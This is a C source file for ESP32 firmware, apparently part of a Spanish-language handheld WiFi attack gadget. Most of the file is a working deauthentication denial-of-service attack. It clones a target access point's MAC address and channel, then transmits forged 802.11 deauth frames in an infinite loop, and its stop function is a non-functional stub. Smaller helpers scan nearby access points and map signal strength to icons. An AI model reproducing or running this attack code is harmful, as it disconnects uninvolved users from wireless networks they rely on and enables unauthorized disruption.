#include "wifi_controller.h"
#include "icons.h"
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include "ataques_wifi.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "globals.h"
#include "wifi.h"


static const char *TAG = "main:attack_dos";

static const uint8_t deauth_frame_template[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

void attack_dos_start(wifi_ap_record_t *ap_record) {
	ESP_ERROR_CHECK(esp_event_loop_create_default());
    wifictl_mgmt_ap_start();
    mostrar_mensaje("Ataque en curso", false, menu_actual);
    ESP_LOGI(TAG, "Starting DoS attack...");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 0
        },
    };
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
    vTaskDelay(3000 / portTICK_PERIOD_MS);
    while (true) {
        send_deauth_frame(ap_record);
        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
}

void attack_dos_stop() {
    /* no funciona por ahora :) */
    ESP_LOGI(TAG, "DoS attack stopped");
}

void send_deauth_frame(const wifi_ap_record_t *ap_record) {
    uint8_t deauth_frame[sizeof(deauth_frame_template)];
    
    memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame));
    memcpy(deauth_frame+10, ap_record->bssid, 6);
    memcpy(deauth_frame+16, ap_record->bssid, 6);

    ESP_LOGI(TAG, "Sending deauth frame...");
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false));
}

void get_aps() {
    static const char *TAG = "WIFI_SCAN";
    if (iniciar_wifi(TAG, WIFI_MODE_STA) == -1) {
        return;
    }
    wifictl_scan_nearby_aps();
    basta_wifi();
}

const char *rssi_to_icon(int8_t rssi) {
    if (rssi >=  -70) return &wifi_bitmap_4;
    if (rssi >=  -85) return &wifi_bitmap_3;
    if (rssi >= -100) return &wifi_bitmap_2;
    if (rssi >= -128) return &wifi_bitmap_1;
    return &wifi_bitmap_0;
}
